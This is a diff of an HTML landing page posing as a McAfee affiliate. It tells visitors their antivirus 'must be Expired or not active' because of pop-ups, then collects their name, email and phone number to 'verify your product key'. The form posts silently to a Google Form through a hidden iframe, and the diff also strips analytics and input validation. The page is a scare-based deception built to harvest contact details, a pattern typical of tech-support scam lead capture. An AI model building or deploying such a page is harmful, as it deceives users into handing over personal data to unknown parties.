@@ -5,79 +5,64 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Antivirus, Mobile Security | SecureSoftware</title>
-    <link rel="icon" href="https://securesoftware.online/wp-content/uploads/2022/08/cropped-mcafee-7875-1-32x32.png" sizes="32x32" />
+    <link rel="icon" href="https://securesoftware.online/wp-content/uploads/2022/08/cropped-mcafee-7875-1-32x32.png" sizes="32x32">
     <link rel="stylesheet" href="styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
-    <script async data-id="101468025" src="//static.getclicky.com/js"></script> <!--Clicky-->
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-66Z8ZHKJNM"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-66Z8ZHKJNM');
-</script>
 <body>
     <div class="container">
         <img id="headerimg" src="header.png" alt="Header Image" class="responsive-img">
     </div>
-        <div class="box">
-                <div class="textbox">
-                <h1>Attention!</h1>
-                <h2>If you are getting too many pop-ups!<br><br>
-                    Your Antivirus Protection must be Expired or not active!</h2>
-                <h3>Click below to check your subscription or activate your product</h3>
-                <div id="button-container">
-                    <button class="bt1" onclick="openForm()">Activate your product</button>
-                    <button class="bt2" onclick="openForm()">Check your subscription</button>
-                </div>
-            </div>
-            <div class="image-container">
-                <img src="igame.jpg" alt="Background Image">
+    <div class="box">
+        <div class="textbox">
+            <h1>Attention!</h1>
+            <h2>If you are getting too many pop-ups!<br><br>
+                Your Antivirus Protection must be Expired or not active!</h2>
+            <h3>Click below to check your subscription or activate your product</h3>
+            <div id="button-container">
+                <button class="bt1" onclick="openForm()">Activate your product</button>
+                <button class="bt2" onclick="openForm()">Check your subscription</button>
             </div>
         </div>
-
+        <div class="image-container">
+            <img src="igame.jpg" alt="Background Image" class="responsive-img">
+        </div>
+    </div>
     <footer class="container">
         <h6>Advertisement by Independent Affiliate of McAfee</h6>
     </footer>
 
-     <!-- Overlay -->
-     <div class="overlay" id="overlay"></div>
+    <div class="overlay" id="overlay"></div>
 
     <div class="form-popup" id="myForm">
-        <!-- Hidden iframe for background submission -->
-<iframe name="hidden_iframe" style="display:none;"></iframe>
-
-<form id="form_data" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9Ol1gHfwaC5vtFFPYO3rRTkedQMBoo10uSVFd-kacs9NpQg/formResponse" 
-      method="post" 
-      class="form-container" 
-      autocomplete="on" 
-      target="hidden_iframe" 
-      onsubmit="redirectAfterSubmit()">
-      
-    <h2 id="popup-heading">Please fill out the details below to verify your product key</h2>
-    <input type="text" id="name" class="input et_contact_error" name="entry.384022412" required placeholder="Name" pattern="[A-Za-z\s-]*" title="Only letters, spaces, and hyphens are allowed.">
-    <input type="email" id="email" class="input et_contact_error" name="entry.250265365" required placeholder="Email">
-    <input type="tel" id="phone" class="input et_contact_error" name="entry.1598428091" required placeholder="Phone Number" pattern="(\+91)?[0-9]{10}" title="Enter a valid 10-digit phone number, optionally starting with +91." maxlength="13">
-    <button type="submit" class="btn">Submit</button>
-</form>
+        <iframe name="hidden_iframe" style="display:none;"></iframe>
+        <form id="form_data" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9Ol1gHfwaC5vtFFPYO3rRTkedQMBoo10uSVFd-kacs9NpQg/formResponse" 
+              method="post" 
+              class="form-container" 
+              autocomplete="on" 
+              target="hidden_iframe" 
+              onsubmit="redirectAfterSubmit()">
+            <h2 id="popup-heading">Please fill out the details below to verify your product key</h2>
+            <input type="text" id="name" class="input et_contact_error" name="entry.384022412" required placeholder="Name">
+            <input type="email" id="email" class="input et_contact_error" name="entry.250265365" required placeholder="Email">
+            <input type="tel" id="phone" class="input et_contact_error" name="entry.1598428091" required placeholder="Phone Number">
+            <button type="submit" class="btn">Submit</button>
+        </form>
     </div>
 
     <script>
         function openForm() {
             document.getElementById("overlay").style.display = "block";
             document.getElementById("myForm").style.display = "block";
-        } // To Open Form
+        }
 
         function redirectAfterSubmit() {
-        setTimeout(function() {
-            window.location.href = "https://www.mcafee.com/consumer/en-us/ipz/checkout/2web/payment.html?"; // Replace with your desired URL
-        }, 500); // Adjust delay as needed
-    };
+            setTimeout(function() {
+                window.location.href = "https://www.mcafee.com/consumer/en-us/ipz/checkout/2web/payment.html?";
+            }, 500);
+        }
     </script>
 </body>
 </html>
